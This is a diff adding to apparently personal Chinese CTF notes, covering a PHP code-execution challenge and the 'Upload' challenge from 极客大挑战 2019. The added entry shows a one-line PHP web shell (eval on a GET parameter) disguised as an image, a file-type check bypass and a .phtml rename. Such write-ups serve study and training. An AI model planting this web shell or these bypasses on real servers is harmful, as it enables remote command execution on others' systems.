@@ -79,3 +79,6 @@
 	向其发送POST请求Syc=var_dump(scandir(’/‘))，其返回所在目录的结构，查看源代码(黑色背景看不到)，看到当前目录有flag文件，发送POST请求Syc=var_dump(get_file_contents('/flag'))返回flag。
 	![[Pasted image 20231023175937.png]]
 	var_dump打印变量。scandir扫描目录，返回数组。get_file_contents将文件读入字符串返回
+[极客大挑战 2019]Upload
+	#文件上传漏洞 
+	上传一句话木马图片，提示非图片，加上图片头，过检测，提示包含< ？使用js执行php脚本<script language='php'>eval($_GET[cmd]);</script>,上传成功，但是其不会自动执行，在burpsuite抓包之后，修改其后缀为phtml(包含php的html)，猜测其在upload文件夹下，进入执行，通过system()请求ls命令以及ls /
